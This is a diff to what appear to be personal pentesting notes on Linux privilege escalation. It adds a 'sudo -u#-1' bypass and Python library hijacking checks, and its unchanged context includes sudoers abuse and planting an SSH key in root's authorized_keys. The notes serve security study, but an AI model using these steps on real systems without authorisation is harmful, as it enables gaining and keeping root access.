@@ -20,6 +20,11 @@ Check for sudo abuse.
 ```shell-session
 $ sudo -l
 ```
+- Run sudo as another user
+It was a vulnerability. Use user ID to 
+```shell-session
+$ sudo -u#-1 id
+```
 ### Sudoers
 If the file `etc/sudoers` /could be made editable (for example using `setfacl`, add sudo privileges directly and `sudo su` to get root.
 ```bash
@@ -35,8 +40,14 @@ $ readelf -d <executable>  | grep PATH
 ### Python Library Hijacking
 3 basic vulnerabilities where we can hijack:
 1. Wrong write permissions
+```shell-session
+$ pip3 show <module>
+```
 2. Library Path
 3. PYTHONPATH environment variable
+```shell-session
+$ python3 -c 'import sys; print("\n".join(sys.path))'
+```
 ## Writeable Files/Directories
 ```shell-session
 $ find / -path /proc -prune -o -type <f/d> -perm -o+w 2>/dev/null
@@ -49,9 +60,10 @@ Generate public-private key and paste the public in server
 echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
 ```
 # Information Gathering
-## OS Release
+## OS Info
 ```shell-session
 $ cat /etc/os-release
+$ cat /etc/lsb-release
 ```
 ## System Path
 ```shell-session
